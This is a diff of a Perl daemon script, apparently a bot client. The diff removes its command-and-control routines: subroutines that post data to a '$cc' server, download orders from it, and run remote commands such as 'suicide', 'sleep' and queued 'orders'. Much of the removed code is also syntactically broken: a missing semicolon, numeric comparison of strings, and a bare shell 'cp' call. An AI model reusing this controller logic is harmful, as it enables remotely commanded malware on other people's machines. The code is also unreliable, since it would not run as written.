@@ -1,7 +1,6 @@
 #!/usr/local/bin/perl
 use strict; use warnings;
 use Proc::Daemon; use IO::Socket;
-use LWP::UserAgent;
 #####################################
 # SUMMON SCROLL
 # INIT ##############################
@@ -98,53 +97,4 @@ sub TIME
   my $H = split(/\s+/, $t)[3]; my $h = split(/\:/, $H)[0];
   my $time = $m . '_' . $d . '_' . $h;
   return $time;
-}
-sub POST
-{
-  my $data = shift; my $key = popkrip();
-  my $ua = useragent();
-  my $req = HTTP::Request->new(POST => $cc/$key)
-  $req->content($data);
-  print "response $ua->request($req)->as_string\n";
-}
-sub WORD
-{
-  my $key = popkrip(); my $ua = useragent();
-  my $res = $ua->get("$cc/i/$key", ':content_file'=>$WORD);
-}
-sub Wread
-{
-  my $key = shift;
-  open($Rfh, '<', "$dump/$key");
-  my @cmds = readline $Rfh; chomp @cmds; close $Rfh;
-  my $cmd = @cmds[0]; my $value = @cmds[1];
-# (suicide, $boolean) (sleep, $x) (append, $WORD) (orders, $WORD)
-  if ($cmd == 'suicide' && $value == '1')
-    { SUICIDE(); }
-  if ($cmd == 'sleep')
-    { open($Sfh, '>', $SLEEP); print "$Sfh" "$value"; close $Sfh; SLEEP(); }
-  if ($cmd == 'append')
-  {
-    open(my $Wfh, '<', $WORD);
-    my @aQUE = readline $Wfh;
-    chomp @aQUE; close $Wfh;
-    foreach (@aQUE)
-      { push @QUE, $_; }
-  }
-  if ($cmd == 'orders')
-    { cp $WORD que/$value; }
-}
-sub popkrip
-{
-  open($Kfh, '>', $KEYS);
-  my @list = readline $Kfh; chomp @list;
-  my $key = shift @list; print $Kfh @list;
-  close $Kfh; return $key;
-}
-sub useragent
-{
-  my $ua = LWP::UserAgent->new(
-# AGENT ##########################
-  );
-  return $ua;
 }
